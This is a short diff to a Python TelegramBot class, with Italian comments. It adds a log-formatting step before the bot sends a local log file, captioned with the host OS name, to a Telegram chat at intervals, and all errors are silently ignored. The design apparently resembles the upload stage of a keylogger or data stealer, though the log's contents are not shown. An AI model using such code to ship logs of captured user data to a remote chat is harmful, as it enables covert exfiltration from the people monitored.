@@ -2,6 +2,7 @@ import os
 import asyncio
 import platform
 from telegram import Bot
+from modules.log_formatter import LogFormatter
 
 class TelegramBot:
     def __init__(self, bot_token, chat_id, log_file, send_interval):
@@ -17,12 +18,23 @@ class TelegramBot:
         try:
             bot = Bot(token=self.bot_token)
             
-            with open(self.log_file, 'rb') as file:
+            # Crea versione formattata con estensione .txt
+            formatted_path = self.log_file + '.formatted.txt'
+            LogFormatter.format_log(self.log_file, formatted_path)
+            
+            # Invia il file formattato se esiste, altrimenti quello grezzo
+            file_to_send = formatted_path if os.path.exists(formatted_path) else self.log_file
+            
+            with open(file_to_send, 'rb') as file:
                 await bot.send_document(
                     chat_id=self.chat_id,
                     document=file,
                     caption=f"Log file - {platform.system()}"
                 )
+            
+            # Rimuovi il file formattato temporaneo
+            if os.path.exists(formatted_path):
+                os.remove(formatted_path)
             
         except Exception as e:
             pass
